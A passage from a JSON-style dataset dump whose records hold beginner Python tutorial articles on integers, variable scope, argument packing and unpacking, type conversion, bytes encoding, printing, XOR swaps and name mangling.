divisibility# Notice the indentation after function declaration# and if and else statementsdef checkDivisibility(a, b):\u00a0\u00a0\u00a0\u00a0if a % b == 0 :\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"a is divisible by b\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"a is not divisible by b\")#Driver program to test the above functioncheckDivisibility(4, 2)The output is :\u00a0a is divisible by bSo, python is a very simplified and less cumbersome language to code in. This easiness of python is itself promoting its wide use.https://www.youtube.com/watch?v=gzDPuWKjmGQNext Article- Python Data TypesQuiz\u00a0\u2013 Functions in PythonThis article has been contributed by Nikhil Kumar Singh.\u00a0Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0\u00a0\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "21dd4f8dc2c807aec50305ff9c73af65",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Consider below Python program.\u00a0Python3# A Python program to demonstrate that we can store# large numbers in Python\u00a0x = 10000000000000000000000000000000000000000000x = x + 1print (x)Output :\u00a010000000000000000000000000000000000000000001In Python, value of an integer is not restricted by the number of bits and can expand to the limit of the available memory (Sources : this and this). Thus we never need any special arrangement for storing large numbers (Imagine doing above arithmetic in C/C++).As a side note, in Python 3, there is only one type \u201cint\u201d for all type of integers. In Python 2.7. there are two separate types \u201cint\u201d (which is 32 bit) and \u201clong int\u201d that is same as \u201cint\u201d of Python 3.x, i.e., can store arbitrarily large numbers.\u00a0Python# A Python program to show that there are two types in# Python 2.7 : int and long int# And in Python 3 there is only one type : int\u00a0x = 10print(type(x))\u00a0x = 10000000000000000000000000000000000000000000print(type(x))Output in Python 2.7 :\u00a0\u00a0<type 'int'>\n<type 'long'>Python3# A Python3 program to show that there are two types in# Python 2.7 : int and long int# And in Python 3 there is only one type : int\u00a0x = 10print(type(x))\u00a0x = 10000000000000000000000000000000000000000000print(type(x))Output in Python 3 :\u00a0\u00a0<type 'int'>\n<type 'int'>We may want to try more interesting programs like below :\u00a0\u00a0Python3# Printing 100 raise to power 100print(100**100)This article is contributed by Abhay Rathi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9409d06199b09113c05ff53f93a512de",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "\u00a0Global variables are those which are not defined inside any function and have a global scope whereas local variables are those which are defined inside a function and its scope is limited to that function only. In other words, we can say that local variables are accessible only inside the function in which it was initialized whereas the global variables are accessible throughout the program and inside every function.\u00a0Local VariablesLocal variables are those which are initialized inside a function and belongs only to that particular function. It cannot be accessed anywhere outside the function. Let\u2019s see how to create a local variable.Example: Creating local variablesPython3def f():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# local variable\u00a0\u00a0\u00a0\u00a0s = \"I love Geeksforgeeks\"\u00a0\u00a0\u00a0\u00a0print(s)\u00a0# Driver codef()OutputI love GeeksforgeeksIf we will try to use this local variable outside the function then let\u2019s see what will happen.Example:Python3def f():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# local variable\u00a0\u00a0\u00a0\u00a0s = \"I love Geeksforgeeks\"\u00a0\u00a0\u00a0\u00a0print(\"Inside Function:\", s)\u00a0# Driver codef()print(s)OutputNameError: name 's' is not definedGlobal VariablesThe global variables are those which are defined outside any function and which are accessible throughout the program i.e. inside and outside of every function Let\u2019s see how to create a global variable.Example: Defining and accessing global variablesPython3# This function uses global variable sdef f():\u00a0\u00a0\u00a0\u00a0print(\"Inside Function\", s)\u00a0# Global scopes = \"I love Geeksforgeeks\"f()print(\"Outside Function\", s)OutputInside Function I love Geeksforgeeks\nOutside Function I love GeeksforgeeksThe variable s is defined as the global variable and is used both inside the function as well as outside the function.Note: As there are no locals, the value from the globals will be used.Now, what if there is a variable with the same name initialized inside a function as well as globally. Now the question arises, will the local variable will have some effect on the global variable or vice versa, and what will happen if we change the value of variable inside of the function f()? Will it affect the globals as well? We test it in the following piece of code:\u00a0Python3# This function has a variable with# name same as s.def f():\u00a0\u00a0\u00a0\u00a0s = \"Me too.\"\u00a0\u00a0\u00a0\u00a0print(s)\u00a0# Global scopes = \"I love Geeksforgeeks\"f()print(s)Output:\u00a0Me too.\nI love Geeksforgeeks.If a variable with the same name is defined inside the scope of function as well then it will print the value given inside the function only and not the global value.\u00a0The question is, what if we try to change the value of a global variable inside the function. Let\u2019s see it using the below example.Example:\u00a0Python3# This function uses global variable sdef f():\u00a0\u00a0\u00a0\u00a0s += 'GFG'\u00a0\u00a0\u00a0\u00a0print(\"Inside Function\", s)\u00a0# Global scopes = \"I love Geeksforgeeks\"f()OutputUnboundLocalError: local variable 's' referenced before assignmentTo make the above program work, we need to use the \u201cglobal\u201d keyword. Let\u2019s see what this global keyword is.Global KeywordWe only need to use the global keyword in a function if we want to do assignments or change the global variable. global is not needed for printing and accessing. Python \u201cassumes\u201d that we want a local variable due to the assignment to s inside of f(), so the first statement throws the error message. Any variable which is changed or created inside of a function is local if it hasn\u2019t been declared as a global variable. To tell Python, that we want to use the global variable, we have to use the keyword \u201cglobal\u201d, as can be seen in the following example:\u00a0Example 1: Using global keywordPython3# This function modifies the global variable 's'def f():\u00a0\u00a0\u00a0\u00a0global s\u00a0\u00a0\u00a0\u00a0s += ' GFG'\u00a0\u00a0\u00a0\u00a0print(s)\u00a0\u00a0\u00a0\u00a0s = \"Look for Geeksforgeeks Python Section\"\u00a0\u00a0\u00a0\u00a0print(s)\u00a0# Global Scopes = \"Python is great!\"f()print(s)OutputPython is great! GFG\nLook for Geeksforgeeks Python Section\nLook for Geeksforgeeks Python SectionNow there is no ambiguity.\u00a0Example 2: Using global and local variablesPython3a = 1\u00a0# Uses global because there is no local 'a'def f():\u00a0\u00a0\u00a0\u00a0print('Inside f() : ', a)\u00a0# Variable 'a' is redefined as a localdef g():\u00a0\u00a0\u00a0\u00a0a = 2\u00a0\u00a0\u00a0\u00a0print('Inside g() : ', a)\u00a0# Uses global keyword to modify global 'a'def h():\u00a0\u00a0\u00a0\u00a0global a\u00a0\u00a0\u00a0\u00a0a = 3\u00a0\u00a0\u00a0\u00a0print('Inside h() : ', a)\u00a0\u00a0# Global scopeprint('global : ', a)f()print('global : ', a)g()print('global : ', a)h()print('global : ', a)Outputglobal :  1\nInside f() :  1\nglobal :  1\nInside g() :  2\nglobal :  1\nInside h() :  3\nglobal :  3This article is contributed by Shwetanshu Rohatgi. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9e291d9cd9b42df7355b406aa100678d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "We use two operators * (for tuples) and ** (for dictionaries).\u00a0Background\u00a0Consider a situation where we have a function that receives four arguments. We want to make a call to this function and we have a list of size 4 with us that has all arguments for the function. If we simply pass a list to the function, the call doesn\u2019t work.\u00a0\u00a0Python3# A Python program to demonstrate need# of packing and unpacking\u00a0# A sample function that takes 4 arguments# and prints them.def fun(a, b, c, d):\u00a0\u00a0\u00a0\u00a0print(a, b, c, d)\u00a0# Driver Codemy_list = [1, 2, 3, 4]\u00a0# This doesn't workfun(my_list)Output :\u00a0TypeError: fun() takes exactly 4 arguments (1 given)\u00a0\u00a0Unpacking\u00a0We can use * to unpack the list so that all elements of it can be passed as different parameters.\u00a0Python3# A sample function that takes 4 arguments# and prints the,def fun(a, b, c, d):\u00a0\u00a0\u00a0\u00a0print(a, b, c, d)\u00a0# Driver Codemy_list = [1, 2, 3, 4]\u00a0# Unpacking list into four argumentsfun(*my_list)Output :\u00a0(1, 2, 3, 4)We need to keep in mind that the no. of arguments must be the same as the length of the list that we are unpacking for the arguments.Python3# Error when len(args) != no of actual arguments# required by the function\u00a0args = [0, 1, 4, 9]\u00a0\u00a0def func(a, b, c):\u00a0\u00a0\u00a0\u00a0return a + b + c\u00a0\u00a0# calling function with unpacking argsfunc(*args)Output:Traceback (most recent call last):\n  File \"/home/592a8d2a568a0c12061950aa99d6dec3.py\", line 10, in <module>\n    func(*args)\nTypeError: func() takes 3 positional arguments but 4 were givenAs another example, consider the built-in range() function that expects separate start and stops arguments. If they are not available separately, write the function call with the *-operator to unpack the arguments out of a list or tuple:\u00a0Python3>>>>>> range(3, 6)\u00a0 # normal call with separate arguments[3, 4, 5]>>> args = [3, 6]>>> range(*args)\u00a0 # call with arguments unpacked from a list[3, 4, 5]Packing\u00a0When we don\u2019t know how many arguments need to be passed to a python function, we can use Packing to pack all arguments in a tuple.\u00a0\u00a0Python3# A Python program to demonstrate use# of packing\u00a0# This function uses packing to sum# unknown number of argumentsdef mySum(*args):\u00a0\u00a0\u00a0\u00a0return sum(args)\u00a0# Driver codeprint(mySum(1, 2, 3, 4, 5))print(mySum(10, 20))Output:\u00a0\u00a015\n30The above function mySum() does \u2018packing\u2019 to pack all the arguments that this method call receives into one single variable. Once we have this \u2018packed\u2019 variable, we can do things with it that we would with a normal tuple. args[0] and args[1] would give you the first and second argument, respectively. Since our tuples are immutable, you can convert the args tuple to a list so you can also modify, delete, and re-arrange items in i.\u00a0Packing and Unpacking\u00a0Below is an example that shows both packing and unpacking.\u00a0\u00a0Python3# A Python program to demonstrate both packing and# unpacking.\u00a0# A sample python function that takes three arguments# and prints themdef fun1(a, b, c):\u00a0\u00a0\u00a0\u00a0print(a, b, c)\u00a0# Another sample function.# This is an example of PACKING. All arguments passed# to fun2 are packed into tuple *args.def fun2(*args):\u00a0\u00a0\u00a0\u00a0\u00a0# Convert args tuple to a list so we can modify it\u00a0\u00a0\u00a0\u00a0args = list(args)\u00a0\u00a0\u00a0\u00a0\u00a0# Modifying args\u00a0\u00a0\u00a0\u00a0args[0] = 'Geeksforgeeks'\u00a0\u00a0\u00a0\u00a0args[1] = 'awesome'\u00a0\u00a0\u00a0\u00a0\u00a0# UNPACKING args and calling fun1()\u00a0\u00a0\u00a0\u00a0fun1(*args)\u00a0# Driver codefun2('Hello', 'beautiful', 'world!')Output:\u00a0\u00a0(Geeksforgeeks, awesome, world!)** is used for dictionaries\u00a0\u00a0Python3# A sample program to demonstrate unpacking of# dictionary items using **def fun(a, b, c):\u00a0\u00a0\u00a0\u00a0print(a, b, c)\u00a0# A call with unpacking of dictionaryd = {'a':2, 'b':4, 'c':10}fun(**d)Output:\u00a02 4 10Here ** unpacked the dictionary used with it, and passed the items in the dictionary as keyword arguments to the function. So writing \u201cfun(1, **d)\u201d was equivalent to writing \u201cfun(1, b=4, c=10)\u201d.\u00a0Python3# A Python program to demonstrate packing of# dictionary items using **def fun(**kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0# kwargs is a dict\u00a0\u00a0\u00a0\u00a0print(type(kwargs))\u00a0\u00a0\u00a0\u00a0\u00a0# Printing dictionary items\u00a0\u00a0\u00a0\u00a0for key in kwargs:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"%s = %s\" % (key, kwargs[key]))\u00a0# Driver codefun(name=\"geeks\", ID=\"101\", language=\"Python\")Output<class 'dict'>\nname = geeks\nID = 101\nlanguage = Python\nApplications and Important Points\u00a0Used in socket programming to send a vast number of requests to a server.Used in the Django framework to send variable arguments to view functions.There are wrapper functions that require us to pass in variable arguments.Modification of arguments becomes easy, but at the same time validation is not proper, so they must be used with care.Reference :\u00a0http://hangar.runway7.net/python/packing-unpacking-argumentsThis article is contributed by Shwetanshu Rohatgi. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ce2ed574ceeb23a643f66087f7b6c159",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python defines type conversion functions to directly convert one data type to another which is useful in day-to-day and competitive programming. This article is aimed at providing information about certain conversion functions.There are two types of Type Conversion in Python:Implicit Type ConversionExplicit Type ConversionLet\u2019s discuss them in detail.Implicit Type ConversionIn Implicit type conversion of data types in Python, the Python interpreter automatically converts one data type to another without any user involvement. To get a more clear view of the topic see the below examples.Example:Python3x = 10\u00a0print(\"x is of type:\",type(x))\u00a0y = 10.6print(\"y is of type:\",type(y))\u00a0x = x + y\u00a0print(x)print(\"x is of type:\",type(x))Output:x is of type: <class 'int'>\ny is of type: <class 'float'>\n20.6\nx is of type: <class 'float'>As we can see the type of \u2018x\u2019 got automatically changed to the \u201cfloat\u201d type from the \u201cinteger\u201d type. this is a simple case of Implicit type conversion in python.Explicit Type ConversionIn Explicit Type Conversion in Python, the data type is manually changed by the user as per their requirement. Various forms of explicit type conversion are explained below:\u00a01. int(a, base): This function converts any data type to integer. \u2018Base\u2019 specifies the base in which string is if the data type is a string.2. float(): This function is used to convert any data type to a floating-point number\u00a0Python3# Python code to demonstrate Type conversion# using int(), float()\u00a0# initializing strings = \"10010\"\u00a0# printing string converting to int base 2c = int(s,2)print (\"After converting to integer base 2 : \", end=\"\")print (c)\u00a0# printing string converting to floate = float(s)print (\"After converting to float : \", end=\"\")print (e)Output:\u00a0After converting to integer base 2 : 18\nAfter converting to float : 10010.03. ord() : This function is used to convert a character to integer.4. hex() : This function is to convert integer to hexadecimal string.5. oct() : This function is to convert integer to octal string.Python3# Python code to demonstrate Type conversion# using\u00a0 ord(), hex(), oct()\u00a0# initializing integers = '4'\u00a0# printing character converting to integerc = ord(s)print (\"After converting character to integer : \",end=\"\")print (c)\u00a0# printing integer converting to hexadecimal stringc = hex(56)print (\"After converting 56 to hexadecimal string : \",end=\"\")print (c)\u00a0# printing integer converting to octal stringc = oct(56)print (\"After converting 56 to octal string : \",end=\"\")print (c)Output:\u00a0After converting character to integer : 52\nAfter converting 56 to hexadecimal string : 0x38\nAfter converting 56 to octal string : 0o706. tuple() : This function is used to convert to a tuple.7. set() : This function returns the type after converting to set.8. list() : This function is used to convert any data type to a list type.Python3# Python code to demonstrate Type conversion# using\u00a0 tuple(), set(), list()\u00a0# initializing strings = 'geeks'\u00a0# printing string converting to tuplec = tuple(s)print (\"After converting string to tuple : \",end=\"\")print (c)\u00a0# printing string converting to setc = set(s)print (\"After converting string to set : \",end=\"\")print (c)\u00a0# printing string converting to listc = list(s)print (\"After converting string to list : \",end=\"\")print (c)Output:\u00a0After converting string to tuple : ('g', 'e', 'e', 'k', 's')\nAfter converting string to set : {'k', 'e', 's', 'g'}\nAfter converting string to list : ['g', 'e', 'e', 'k', 's']9. dict() : This function is used to convert a tuple of order (key,value) into a dictionary.10. str() : Used to convert integer into a string.11. complex(real,imag) : This function converts real numbers to complex(real,imag) number.Python3# Python code to demonstrate Type conversion# using\u00a0 dict(), complex(), str()\u00a0# initializing integersa = 1b = 2\u00a0# initializing tupletup = (('a', 1) ,('f', 2), ('g', 3))\u00a0# printing integer converting to complex numberc = complex(1,2)print (\"After converting integer to complex number : \",end=\"\")print (c)\u00a0# printing integer converting to stringc = str(a)print (\"After converting integer to string : \",end=\"\")print (c)\u00a0# printing tuple converting to expression dictionaryc = dict(tup)print (\"After converting tuple to dictionary : \",end=\"\")print (c)Output:\u00a0After converting integer to complex number : (1+2j)\nAfter converting integer to string : 1\nAfter converting tuple to dictionary : {'a': 1, 'f': 2, 'g': 3}12. chr(number): This function converts number to its corresponding ASCII character.\u00a0Python3# Convert ASCII value to charactersa = chr(76)b = chr(77)\u00a0print(a)print(b)Output:\u00a0L\nM\n \u00a0This article is contributed by Manjeet Singh(S. Nandini). If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a2fc752ba45bff9717d554a410ea6b61",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In Python 2, both str and bytes are the same typeByte objects whereas in Python 3 Byte objects, defined in Python 3 are \u201csequence of bytes\u201d and similar to \u201cunicode\u201d objects from Python 2. However, there are many differences in strings and Byte objects. Some of them are depicted below:\u00a0`\u00a0\u00a0Byte objects are sequence of Bytes, whereas Strings are sequence of characters.Byte objects are in machine readable form internally, Strings are only in human readable form.Since Byte objects are machine readable, they can be directly stored on the disk. Whereas, Strings need encoding before which they can be stored on disk.\u00a0There are methods to convert a byte object to String and String to byte objects.\u00a0EncodingPNG, JPEG, MP3, WAV, ASCII, UTF-8 etc are different forms of encodings. An encoding is a format to represent audio, images, text, etc in bytes. Converting Strings to byte objects is termed as encoding. This is necessary so that the text can be stored on disk using mapping using ASCII or UTF-8 encoding techniques.This task is achieved using encode(). It take encoding technique as argument. Default technique is \u201cUTF-8\u201d technique.\u00a0Python3# Python code to demonstrate String encoding\u00a0# initialising a Stringa = 'GeeksforGeeks'\u00a0# initialising a byte objectc = b'GeeksforGeeks'\u00a0# using encode() to encode the String# encoded version of a is stored in d# using ASCII mappingd = a.encode('ASCII')\u00a0# checking if a is converted to bytes or notif (d==c):\u00a0\u00a0\u00a0\u00a0print (\"Encoding successful\")else : print (\"Encoding Unsuccessful\")Output:\u00a0\u00a0Encoding successful\u00a0DecodingSimilarly, Decoding is process to convert a Byte object to String. It is implemented using decode() . A byte string can be decoded back into a character string, if you know which encoding was used to encode it. Encoding and Decoding are inverse processes.\u00a0\u00a0Python3# Python code to demonstrate Byte Decoding\u00a0# initialising a Stringa = 'GeeksforGeeks'\u00a0# initialising a byte objectc = b'GeeksforGeeks'\u00a0# using decode() to decode the Byte object# decoded version of c is stored in d# using ASCII mappingd = c.decode('ASCII')\u00a0# checking if c is converted to String or notif (d==a):\u00a0\u00a0\u00a0\u00a0print (\"Decoding successful\")else : print (\"Decoding Unsuccessful\")Output:\u00a0\u00a0Decoding successfulThis article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e183caa9c096557ca8f579acad730c3d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In Python 3.X, the print statement is written as a print() function. Below is code in Python 3.X that shows the process of printing values in Python.Example 1: Printing Single valuePython3# Equivalent codes in Python 3.0# (Produces same output)\u00a0# Code 1:print(1)\u00a0# Code 2 :print((1))Output:\u00a01 \n1Example 2: Printing multiple values\u00a0\u00a0Python3# Code 1:print(1, 2)\u00a0# Code 2:print((1, 2))\u00a0# Code 3:# printing on the same line# for printing on the same line use# end parameters of the print function# end takes the values which is printing# at the end of the output.print(1, end=\" \")print(2)Output:\u00a01 2\n(1, 2)\n1 2This article is contributed by Arpit Agarwal. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "2fd2f473578f230e1d3792d19bbff612",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "We have discussed different approaches to swap two integers without the temporary variable. How to swap into a single line without using the library function?1) Python: In Python, there is a simple and syntactically neat construct to swap variables, we just need to write \u201cx, y = y, x\u201d.2) C/C++: Below is one generally provided classical solution:\u00a0// Swap using bitwise XOR (Wrong Solution in C/C++)\nx ^= y ^= x ^= y; The above solution is wrong in C/C++ as it causes undefined behavior (the compiler is free to behave in any way). The reason is, modifying a variable more than once in an expression causes undefined behavior if there is no sequence point between the modifications.\u00a0However, we can use a comma to introduce sequence points. So the modified solution is\u00a0// Swap using bitwise XOR (Correct Solution in C/C++)\n// sequence point introduced using comma.\n(x ^= y), (y ^= x), (x ^= y);3) Java: In Java, rules for subexpression evaluations are clearly defined. The left-hand operand is always evaluated before the right-hand operand. In Java, the expression \u201cx ^= y ^= x ^= y;\u201d doesn\u2019t produce the correct result according to Java rules. It makes x = 0. However, we can use \u201cx = x ^ y ^ (y = x);\u201d Note the expressions are evaluated from left to right. If x = 5 and y = 10 initially, the expression is equivalent to \u201cx = 5 ^ 10 ^ (y = 5);\u201d. Note that we can\u2019t use this in C/C++ as in C/C++, it is not defined whether the left operand or right operand is executed by any operator (See this for more details).4) JavaScript: Using destructing assignment, we can simply achieve swapping using this one line.\u00a0[x,y]=[y,x]C// C program to swap two variables in single line#include <stdio.h>int main(){\u00a0\u00a0\u00a0\u00a0int x = 5, y = 10;\u00a0\u00a0\u00a0\u00a0(x ^= y), (y ^= x), (x ^= y);\u00a0\u00a0\u00a0\u00a0printf(\"After Swapping values of x and y are %d %d\", x,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0y);\u00a0\u00a0\u00a0\u00a0return 0;}C++// C++ code to swap using XOR#include <bits/stdc++.h>\u00a0using namespace std;\u00a0int main(){\u00a0\u00a0\u00a0\u00a0int x = 5, y = 10;\u00a0\u00a0\u00a0\u00a0// Code to swap 'x'\u00a0 and 'y'\u00a0\u00a0\u00a0\u00a0// to swap two numbers in one\u00a0\u00a0\u00a0\u00a0// line\u00a0\u00a0\u00a0\u00a0\u00a0x = x ^ y, y = x ^ y, x = x ^ y;\u00a0\u00a0\u00a0\u00a0// printing the swapped variables\u00a0\u00a0\u00a0\u00a0cout << \"After Swapping: x = \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<< x << \", y= \" << y;\u00a0\u00a0\u00a0\u00a0return 0;}Java// Java program to swap two variables in a single lineclass GFG {\u00a0\u00a0\u00a0\u00a0public static void main(String[] args)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int x = 5, y = 10;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x = x ^ y ^ (y = x);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"After Swapping values\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+\" of x and y are \" + x\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \" \" + y);\u00a0\u00a0\u00a0\u00a0}}Python3# Python program to swap two variables in a single linex = 5y = 10x, y = y, xprint(\"After Swapping values of x and y are\", x, y)C#// C# program to swap two// variables in single lineusing System;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0static public void Main()\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int x = 5, y = 10;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x = x ^ y ^ (y = x);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Console.WriteLine(\"After Swapping values \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"of x and y are \" + x + \" \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ y);\u00a0\u00a0\u00a0\u00a0}}\u00a0// This code is contributed by aj_36PHP<?php// PHP program to swap two// variables in single line\u00a0\u00a0\u00a0\u00a0\u00a0// Driver Code\u00a0\u00a0\u00a0\u00a0$x = 5;\u00a0\u00a0\u00a0\u00a0$y = 10;\u00a0\u00a0\u00a0\u00a0($x ^= $y);\u00a0\u00a0\u00a0\u00a0($y ^= $x);\u00a0\u00a0\u00a0\u00a0($x ^= $y);\u00a0\u00a0\u00a0\u00a0echo \"After Swapping values of x and y are \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0,$x,\" \", $y;\u00a0// This code is contributed by Vishal Tripathi?>Javascript<script>// javascript program to swap two variables in single line\u00a0\u00a0\u00a0\u00a0\u00a0let x = 5, y = 10;\u00a0\u00a0\u00a0\u00a0(x ^= y), (y ^= x), (x ^= y);\u00a0\u00a0\u00a0\u00a0document.write(\"After Swapping values of x and y are \", x + \" \",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0y);\u00a0\u00a0// This code is contributed by Surbhi Tyagi</script>OutputAfter Swapping values of x and y are 10 5Alternate Solutions:\u00a0Using swap(): C++ library functionb = (a + b) \u2013 (a = b);a += b \u2013 (b = a);a = a * b / (b = a)a = a ^ b ^ (b = a)This article is contributed by\u00a0Harshit Gupta. If you like GeeksforGeeks and would like to contribute, you can also write an article on write.geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "236d8dc51a39b2ad1776ce79ebf587a9",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite: Underscore in PythonIn Python, there is no existence of \u201cPrivate\u201d instance variables that cannot be accessed except inside an object. However, a convention is being followed by most Python code and coders i.e., a name prefixed with an underscore, For e.g. _geek should be treated as a non-public part of the API or any Python code, whether it is a function, a method, or a data member. While going through this we would also try to understand the concept of various forms of trailing underscores, for e.g., for _ in range(10), __init__(self).\u00a0\u00a0Mangling and how it worksIn Python, there is something called name mangling, which means that there is limited support for a valid use-case for class-private members basically to avoid name clashes of names with names defined by subclasses. Any identifier of the form __geek (at least two leading underscores or at most one trailing underscore) is replaced with _classname__geek, where classname is the current class name with a leading underscore(s) stripped. As long as it occurs within the definition of the class, this mangling is done. This is helpful for letting subclasses override methods without breaking intraclass method calls.\u00a0Let\u2019s look at this example and try to find out how this underscore works:\u00a0\u00a0Python# Python code to illustrate how mangling worksclass Map:\u00a0\u00a0\u00a0\u00a0def __init__(self, iterate):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.list = []\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__geek(iterate)\u00a0\u00a0\u00a0\u00a0def geek(self, iterate):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for item in iterate:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.list.append(item)\u00a0\u00a0\u00a0\u00a0\u00a0# private copy of original geek() method\u00a0\u00a0\u00a0\u00a0__geek = geek\u00a0\u00a0\u00a0class MapSubclass(Map):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# provides new signature for geek() but\u00a0\u00a0\u00a0\u00a0# does not break __init__()\u00a0\u00a0\u00a0\u00a0def geek(self, key, 